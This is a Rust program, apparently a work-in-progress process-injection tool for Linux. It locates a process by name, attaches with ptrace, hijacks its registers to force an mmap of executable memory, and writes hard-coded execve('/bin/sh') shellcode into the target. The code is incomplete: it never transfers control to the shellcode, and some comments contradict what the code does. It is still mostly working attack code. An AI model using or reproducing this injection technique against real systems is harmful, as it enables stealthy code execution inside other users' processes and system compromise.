use sysinfo::System;
use libc::{ptrace, PTRACE_ATTACH, PTRACE_DETACH, PTRACE_GETREGS, PTRACE_SETREGS, PTRACE_POKEDATA, waitpid, pid_t, user_regs_struct, sysconf, _SC_PAGESIZE};
use std::io;
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::io::SeekFrom;

fn get_process_id_by_name(name: &str) -> Option<sysinfo::Pid> {
    let mut system = System::new_all();
    system.refresh_all();
    for (_, process) in system.processes() {
        if process.name() == name {
            return Some(process.pid());
        }
    }
    None
}

fn allocate_remote_memory(target_pid: pid_t, size: usize) -> Result<u64, io::Error> {
    unsafe {
        // Attach to the target process
        if ptrace(PTRACE_ATTACH, target_pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>()) == -1 {
            return Err(io::Error::last_os_error());
        }

        waitpid(target_pid, std::ptr::null_mut(), 0);

        let mut regs: user_regs_struct = std::mem::zeroed();
        if ptrace(PTRACE_GETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &mut regs) == -1 {
            return Err(io::Error::last_os_error());
        }

        // Backup registers
        let original_regs = regs;
        let page_size = sysconf(_SC_PAGESIZE) as usize;
        let aligned_size: u64 = ((size + page_size - 1) & !(page_size - 1)) as u64;
 
        // Set up the syscall arguments for mmap
        regs.rax = 9;  // mmap syscall number
        regs.rdi = 0 as u64;  // Set aligned memory address manually
        regs.rsi = aligned_size;  // Page-aligned size
        regs.rdx = (libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC) as u64;  // RW permissions (try adding PROT_EXEC if needed)
        regs.r10 = (libc::MAP_ANONYMOUS | libc::MAP_PRIVATE) as u64;  // Flags
        regs.r8 = u64::MAX;  // Correct file descriptor casting
        regs.r9 = 0;  // Offset

        if ptrace(PTRACE_SETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &regs) == -1 {
            return Err(io::Error::last_os_error());
        }

println!("Before syscall:");
println!("RAX: 0x{:x}", regs.rax);
println!("RDI (addr): 0x{:x}", regs.rdi);
println!("RSI (size): {}", regs.rsi);
println!("RDX (prot): 0x{:x}", regs.rdx);
println!("R10 (flags): 0x{:x}", regs.r10);
println!("R8 (fd): 0x{:x}", regs.r8);
println!("R9 (offset): {}", regs.r9);

        // Execute the syscall
        ptrace(libc::PTRACE_SYSCALL, target_pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());
        waitpid(target_pid, std::ptr::null_mut(), 0);
        ptrace(libc::PTRACE_SYSCALL, target_pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());
        waitpid(target_pid, std::ptr::null_mut(), 0);

        // Read the syscall result (allocated address)
        ptrace(PTRACE_GETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &mut regs);

        ptrace(PTRACE_SETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &original_regs);

println!("After syscall:");
println!("RAX: 0x{:x}", regs.rax);
println!("RDI (addr): 0x{:x}", regs.rdi);
println!("RSI (size): {}", regs.rsi);
println!("RDX (prot): 0x{:x}", regs.rdx);
println!("R10 (flags): 0x{:x}", regs.r10);
println!("R8 (fd): 0x{:x}", regs.r8);
println!("R9 (offset): {}", regs.r9);

        let allocated_address = regs.rax;

        if (allocated_address as i64) < 0{
            return Err(io::Error::last_os_error());
        }

        // Restore original registers

        // Detach from the process
        ptrace(PTRACE_DETACH, target_pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());

        Ok(allocated_address)
    }
}

fn write_shellcode(pid: libc::pid_t, mut address: u64, shellcode: &[u8]) -> Result<(), std::io::Error> {
    unsafe {
        let mut data = [0u8; 8];

        for (i, chunk) in shellcode.chunks(8).enumerate() {
            for (j, &byte) in chunk.iter().enumerate() {
                data[j] = byte;
            }

            let word = u64::from_le_bytes(data);
            if ptrace(PTRACE_POKEDATA, pid, address as *mut libc::c_void, word as *mut libc::c_void) == -1 {
                return Err(std::io::Error::last_os_error());
            }

            address += 8;
        }
    }
    Ok(())
}
fn main() {
    let process_name = "sleep";

    let shellcode: [u8; 32] = [
        0x48, 0x31, 0xff,                         // xor    rdi, rdi
        0x48, 0x89, 0xe6,                         // mov    rsi, rsp
        0x48, 0x8d, 0x3d, 0x0a, 0x00, 0x00, 0x00, // lea    rdi, [rip+10]
        0x31, 0xc0,                               // xor    eax, eax
        0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, // mov    rax, 59 (execve)
        0x0f, 0x05,                               // syscall
        0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00  // "/bin/sh"
    ];

    match get_process_id_by_name(process_name) {
        Some(pid) => {
            println!("Process {} has PID: {}", process_name, pid);
            match allocate_remote_memory(pid.as_u32() as i32, shellcode.len()) {
                Ok(address) => {
                    if (address as i32) < 0 {
                        println!("Error allocating memory: {}", io::Error::from_raw_os_error(address as i32));
                        return;
                    }
                    println!("Allocated {:?} bytes at address: 0x{:x}", address, address);
                    match write_shellcode(pid.as_u32() as i32, address, &shellcode) {
                        Ok(_) => println!("Shellcode written successfully"),
                        Err(e) => println!("Error writing shellcode: {}", e),
                    }
                },
                Err(e) => println!("Error allocating memory: {}", e),
            }
        } 
        None => println!("Process {} not found", process_name),
    }
}
